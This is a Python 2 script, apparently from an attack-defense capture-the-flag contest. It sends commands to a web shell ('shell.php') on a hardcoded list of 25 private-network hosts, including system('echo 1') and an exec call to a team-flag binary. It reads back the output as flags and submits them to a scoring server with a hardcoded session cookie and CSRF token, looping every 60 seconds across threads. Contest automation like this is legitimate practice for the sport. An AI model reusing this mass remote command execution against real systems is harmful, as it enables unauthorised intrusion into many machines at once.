#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
import requests
import json
import re
import lib.workQueue as workQueue
# from lib.zio import *
from lib.pwnlib import *


teamflag = 'WVwypQ';

def getFlag(host):
    flag = ''
    try:
        # host = '172.16.5.11:8082'
        url = 'http://'+host+'/time/files/shell.php'
        print (url)
        headers  = {"Content-Type" : "application/x-www-form-urlencoded"}
        data = "shell=exec('/bin/bash/hereiam -t "+teamflag+"');"
        data=  "shell=system('echo 1')"
      
        response = requests.post(url=url, data=data, headers=headers, timeout=5)
        flag = response.text
        
    except Exception,e:
        print(str(e))
    return flag


def submitFlag(flag):
    print 'submitFlag: flag: ' +  str(flag)
    result = False
    url    = r'http://172.19.0.242:9090/hacker/submit/cert/submitCode'
    data   = 'code='+str(flag).strip()+'&userSubmitId=US86fe594f-9b86-4267-8b12-fe961dd02273202&csrf=2ed3c74a-0413-4987-8010-38282f0704e2'
    headers = {
        "Cookie": "JSESSIONID=2614F8466E09C93101DCA52D183462F0",
        "User-Agent"    : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
        "Content-Type"  : "application/x-www-form-urlencoded; charset=UTF-8",
    }
    try:
        resqonse  = requests.post(url=url, data=data, headers=headers, verify=False)
        print resqonse.content
    except Exception,e:
        print str(e)

    return result


##########################################################################

def capture_flag_thread(host):
    try:
        print '[info] pwn host: {host}'.format(host=str(host))
        flag = getFlag(host=host)
        if submitFlag(flag=flag) == True:
            print '[info] got a flag: {flag} from host: {host}'.format(
                flag=str(flag), host=str(host))
        else:
            print '[err] fail to get a flag:{flag} from host: {host}'.format(
                flag=str(flag), host=str(host))
    except Exception,e:
        print(str(e))
        pass


def capture_flag(hosts, thread_num, thread_timeout):    
    start = time.time()
    work_manager =  workQueue.WorkManager(thread_num=thread_num, thread_timeout=thread_timeout) 
    for host in hosts:
        work_manager.add_job(func=capture_flag_thread,  args=host)
    work_manager.start_jobs()
    end = time.time()
    print "[info] total runtime: %s" % (end-start)

##########################################################################
def pwn_hosts(hosts=[]):
    roundCount = 0
    roundTime = 60
    while True:
        roundCount += 1
        print "******************* round {0} *******************".format(roundCount)
        capture_flag(hosts=hosts, thread_num=10, thread_timeout=5)
        print "waiting for {roundTime}s ...".format(roundTime=roundTime)
        time.sleep(roundTime)

if __name__ == '__main__':
    
    port  = 80
    hosts = [
        "192.168.31.57",
"192.168.31.85",
"192.168.31.116",
"192.168.31.145",
"192.168.32.50",
"192.168.32.90",
"192.168.32.119",
"192.168.32.152",
"192.168.33.48",
"192.168.33.73",
"192.168.33.120",
"192.168.33.145",
"192.168.34.41",
"192.168.34.69",
"192.168.34.103",
"192.168.34.133",
"192.168.35.39",
"192.168.35.81",
"192.168.35.124",
"192.168.35.147",
"192.168.36.44",
"192.168.36.73",
"192.168.36.110",
"192.168.36.137",
"192.168.37.49"

    ]
    for i in xrange(len(hosts)):
        hosts[i] += ":"+str(port)
    
    #pwn_hosts(hosts)
    for i in xrange(len(hosts)):
        flag = getFlag(hosts[i])
    print flag
    #submitFlag(111)


        
